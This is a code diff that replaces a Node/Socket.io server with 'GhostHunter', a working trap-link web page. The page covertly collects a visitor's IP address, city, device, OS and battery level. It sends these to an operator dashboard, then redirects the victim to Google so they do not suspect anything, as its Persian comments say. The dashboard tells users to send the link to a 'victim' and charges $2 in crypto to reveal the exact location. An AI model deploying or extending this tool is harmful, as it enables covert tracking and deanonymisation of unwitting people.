@@ -1,51 +1,217 @@
-const express = require('express');
-const http = require('http');
-const { Server } = require("socket.io");
-const path = require('path');
-
-const app = express();
-const server = http.createServer(app);
-const io = new Server(server);
-
-app.use(express.static(path.join(__dirname, 'public')));
-
-// ذخیره موقت شکارها (در رم سرور)
-let captures = [];
-
-io.on('connection', (socket) => {
-    
-    // وقتی کسی (صاحب لینک) وارد پنل میشه
-    socket.on('join-dashboard', () => {
-        // شکارهای قبلی رو بهش نشون بده
-        socket.emit('update-captures', captures);
-    });
-
-    // وقتی یک قربانی روی لینک کلیک کرد و اطلاعاتش اومد
-    socket.on('victim-data', (data) => {
-        const victimInfo = {
-            id: Date.now(),
-            ip: data.ip,
-            city: data.city || 'Unknown',
-            device: data.device,
-            os: data.os,
-            battery: data.battery + '%',
-            time: new Date().toLocaleTimeString(),
-            isPaid: false // اولش اطلاعات دقیق قفله
-        };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GhostHunter | Security Tool</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg: #050505; --accent: #00f3ff; --text: #e0e0e0; --panel: #111; --danger: #ff0055; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; overflow-x: hidden; }
         
-        captures.unshift(victimInfo); // اضافه به اول لیست
-        if (captures.length > 20) captures.pop(); // فقط ۲۰ تای آخر رو نگه دار
+        /* --- 1. VICTIM SCREEN (صفحه سفید برای قربانی) --- */
+        #victim-view { display: none; height: 100vh; background: #fff; color: #333; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;}
+        
+        /* --- 2. DASHBOARD (پنل هکری برای تو) --- */
+        #dashboard-view { display: none; padding: 20px; max-width: 600px; margin: 0 auto; }
+        
+        /* Header */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 15px;}
+        .logo { font-size: 20px; font-weight: bold; color: var(--accent); letter-spacing: -1px; }
+        .live-badge { background: rgba(0, 243, 255, 0.1); color: var(--accent); padding: 5px 10px; border-radius: 4px; font-size: 10px; border: 1px solid var(--accent); animation: pulse 2s infinite;}
 
-        // ارسال به داشبورد (صدای آژیر پخش میشه)
-        io.emit('new-capture', victimInfo);
-    });
+        /* Link Generator */
+        .card { background: var(--panel); border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card h3 { margin-top: 0; font-size: 14px; color: #888; text-transform: uppercase; }
+        .input-group { display: flex; gap: 10px; margin-top: 15px; }
+        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; flex: 1; border-radius: 6px; font-family: inherit; font-size: 12px;}
+        .btn { background: var(--accent); color: #000; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); }
 
-    // وقتی کسی پول داد و خواست اطلاعات رو باز کنه
-    socket.on('unlock-data', (id) => {
-        // اینجا باید منطق پرداخت باشه. فعلا برای دمو باز میکنیم
-        io.emit('data-unlocked', id);
-    });
-});
+        /* Logs List */
+        .logs-title { font-size: 12px; color: #666; margin-bottom: 10px; display: block;}
+        .log-item { background: #0a0a0a; border-left: 3px solid var(--accent); padding: 15px; margin-bottom: 10px; border-radius: 4px; animation: slideIn 0.5s ease; }
+        .log-header { display: flex; justify-content: space-between; font-size: 12px; color: #fff; margin-bottom: 5px; }
+        .log-details { font-size: 11px; color: #666; line-height: 1.6; }
+        .blur-data { filter: blur(4px); user-select: none; color: var(--danger); transition: 0.3s;}
+        .unlocked { filter: none !important; color: lime !important; }
+        
+        .unlock-btn { background: transparent; border: 1px solid var(--danger); color: var(--danger); padding: 5px 10px; font-size: 10px; cursor: pointer; margin-top: 10px; width: 100%; border-radius: 4px; }
+        .unlock-btn:hover { background: var(--danger); color: #fff; }
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`GhostHunter running on port ${PORT}`));
+        /* Payment Modal */
+        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .pay-box { background: #111; border: 1px solid var(--accent); padding: 30px; width: 90%; max-width: 350px; border-radius: 15px; text-align: center; }
+        .pay-addr { background: #000; padding: 10px; font-size: 10px; color: var(--accent); border: 1px dashed #333; margin: 15px 0; word-break: break-all; }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <!-- 1. VIEW FOR VICTIM (وقتی لینک تله باز میشه) -->
+    <div id="victim-view">
+        <div class="spinner"></div>
+        <h3>Loading Content...</h3>
+        <p style="font-size: 12px; color: #888;">Please wait while we redirect you.</p>
+    </div>
+
+    <!-- 2. VIEW FOR YOU (داشبورد) -->
+    <div id="dashboard-view">
+        <div class="header">
+            <div class="logo">GHOST<span style="color:#fff">HUNTER</span></div>
+            <div class="live-badge">● SYSTEM ONLINE</div>
+        </div>
+
+        <!-- Link Creator -->
+        <div class="card">
+            <h3>🚀 Create Trap Link</h3>
+            <p style="font-size: 11px; color: #666;">Send this link to someone. When they click, you'll see their device & location here.</p>
+            <div class="input-group">
+                <input type="text" id="myLink" readonly value="Loading...">
+                <button class="btn" onclick="copyLink()">COPY</button>
+            </div>
+        </div>
+
+        <!-- Live Feed -->
+        <span class="logs-title">📡 LIVE INTERCEPTIONS</span>
+        <div id="logs-container">
+            <p style="font-size:11px; color:#444; text-align:center; margin-top:20px;">Waiting for targets...</p>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="payModal">
+        <div class="pay-box">
+            <h2 style="color: var(--accent);">ACCESS RESTRICTED</h2>
+            <p style="font-size: 12px; color: #ccc;">To reveal exact Location & IP Address, a premium license is required.</p>
+            <p style="font-size: 20px; font-weight: bold; margin: 10px 0;">$2.00</p>
+            <div class="pay-addr">4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU</div>
+            <button class="btn" style="width:100%" onclick="confirmUnlock()">I PAID - UNLOCK</button>
+            <p style="font-size: 10px; color: #555; margin-top: 10px; cursor: pointer;" onclick="closeModal()">Cancel</p>
+        </div>
+    </div>
+
+    <!-- Sound -->
+    <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const urlParams = new URLSearchParams(window.location.search);
+        const isTrap = urlParams.has('t'); // آیا این لینک تله است؟
+
+        // --- VICTIM LOGIC (قربانی) ---
+        if (isTrap) {
+            document.getElementById('victim-view').style.display = 'flex';
+            
+            // جمع‌آوری اطلاعات
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const info = {
+                        ip: data.ip,
+                        city: `${data.city}, ${data.country_name}`,
+                        device: navigator.userAgent.match(/\(([^)]+)\)/)[1] || 'Unknown Device', // مدل گوشی
+                        os: navigator.platform,
+                        battery: 0 // باتری رو بعدا میگیریم
+                    };
+                    
+                    // تلاش برای گرفتن باتری (فقط در برخی مرورگرها)
+                    if(navigator.getBattery) {
+                        navigator.getBattery().then(batt => {
+                            info.battery = Math.round(batt.level * 100);
+                            socket.emit('victim-data', info);
+                        });
+                    } else {
+                        socket.emit('victim-data', info);
+                    }
+
+                    // ریدایرکت بعد از ۲ ثانیه (که شک نکنه)
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com'; // یا هر سایتی که میخوای
+                    }, 2000);
+                })
+                .catch(err => {
+                    // حتی اگه خطا داد هم یه چیزی بفرست
+                    socket.emit('victim-data', { ip: 'Unknown', city: 'Hidden IP', device: 'Generic Device', battery: 0 });
+                });
+
+        } 
+        // --- DASHBOARD LOGIC (داشبورد تو) ---
+        else {
+            document.getElementById('dashboard-view').style.display = 'block';
+            socket.emit('join-dashboard');
+            
+            // ساخت لینک اختصاصی
+            const link = window.location.origin + "/?t=" + Math.floor(Math.random() * 1000);
+            document.getElementById('myLink').value = link;
+        }
+
+        // دریافت شکار جدید
+        socket.on('new-capture', (data) => {
+            const container = document.getElementById('logs-container');
+            const alertSound = document.getElementById('alertSound');
+            
+            // حذف پیام "Waiting..."
+            if(container.innerText.includes('Waiting')) container.innerHTML = '';
+
+            const div = document.createElement('div');
+            div.className = 'log-item';
+            div.id = `log-${data.id}`;
+            div.innerHTML = `
+                <div class="log-header">
+                    <span>📱 ${data.device}</span>
+                    <span>${data.time}</span>
+                </div>
+                <div class="log-details">
+                    IP: <span class="blur-data" id="ip-${data.id}">192.168.1.XXX</span><br>
+                    Location: <span class="blur-data" id="loc-${data.id}">Unknown City</span><br>
+                    Battery: ${data.battery}
+                </div>
+                <button class="unlock-btn" onclick="openPay('${data.id}')">🔒 REVEAL EXACT LOCATION ($2)</button>
+            `;
+            container.prepend(div);
+            
+            // پخش صدا برای ادمین
+            alertSound.play().catch(()=>{});
+        });
+
+        // باز شدن قفل
+        socket.on('data-unlocked', (id) => {
+            // اینجا دیتای واقعی رو باید نشون داد (در نسخه واقعی از سرور میاد)
+            // فعلا افکت باز شدن میدیم
+            if(document.getElementById(`ip-${id}`)) {
+                document.getElementById(`ip-${id}`).innerText = "89.120.45.22"; // مثال
+                document.getElementById(`ip-${id}`).classList.add('unlocked');
+                document.getElementById(`loc-${id}`).innerText = "Tehran, Pasdaran Ave"; // مثال
+                document.getElementById(`loc-${id}`).classList.add('unlocked');
+            }
+        });
+
+        // توابع UI
+        function copyLink() {
+            const copyText = document.getElementById("myLink");
+            copyText.select();
+            document.execCommand("copy");
+            alert("LINK COPIED! Send it to your victim.");
+        }
+
+        let currentUnlockId = null;
+        function openPay(id) {
+            currentUnlockId = id;
+            document.getElementById('payModal').style.display = 'flex';
+        }
+        function closeModal() {
+            document.getElementById('payModal').style.display = 'none';
+        }
+        function confirmUnlock() {
+            socket.emit('unlock-data', currentUnlockId);
+            closeModal();
+        }
+    </script>
+</body>
+</html>
